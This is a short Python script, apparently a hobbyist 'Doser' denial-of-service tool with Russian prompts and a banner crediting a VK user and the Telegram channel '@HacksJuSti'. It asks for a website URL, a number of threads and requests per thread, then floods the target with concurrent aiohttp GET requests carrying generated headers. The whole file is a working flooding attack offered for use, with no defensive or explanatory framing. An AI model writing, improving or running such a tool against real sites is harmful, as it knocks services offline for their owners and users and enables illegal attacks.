import asyncio
import os
from datetime import datetime
from threading import Thread

import aiohttp
from colorama import Fore

from generate_headers import initHeaders
from get_proxy import get_proxy


def clear ():
    if os.name == 'nt':
        os.system ('cls')
    else:
        os.system ('clear')


def timestamp (function):
    def wrapper (*args):

        start = datetime.now ()
        function (*args)
        end = datetime.now ()

        print ('У этого потока ушло ' + str (end - start))

    return wrapper


async def make_request (url: str):    
    async with aiohttp.ClientSession () as session:
        try:
            async with session.get (url, headers = initHeaders ()) as response:
                print (Fore.GREEN + 'Запрос на ' + url + ' Выполнен' + Fore.RESET)
        except:
            print (Fore.RED + 'Запрос на ' + url + ' Не Выполнен' + Fore.RESET)


   
async def main (url: str, tasksCount: int):

    tasks = []
    
    for i in range (tasksCount):            
        task = asyncio.create_task (make_request (url))
        tasks.append (task)
           
    await asyncio.gather (*tasks)


@timestamp
def start (url: str,  tasksCount: int):
    asyncio.run (main (url, tasksCount))


if __name__ == '__main__':

    clear ()

    print ('''
Создатель: VK @ahahahahahahahahahahahahaha_kek
Наш телеграмчик: @HacksJuSti
·▄▄▄▄        .▄▄ · ▄▄▄ .▄▄▄  
██▪ ██ ▪     ▐█ ▀. ▀▄.▀·▀▄ █·
▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ 
██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄▄▌▐█•█▌
▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀  ▀ 
    ''')

    #ask custom param
    url = str (input ('Url сайта: '))
    threadCount = int (input ('Кол-во потоков: '))
    tasksCount = int (input ('Кол-во запросов для каждого потока: '))
    
    #init threads
    for i in range (threadCount):
        t = Thread (target = start, name = f'thread{i}', args = (url, tasksCount))
        t.start ()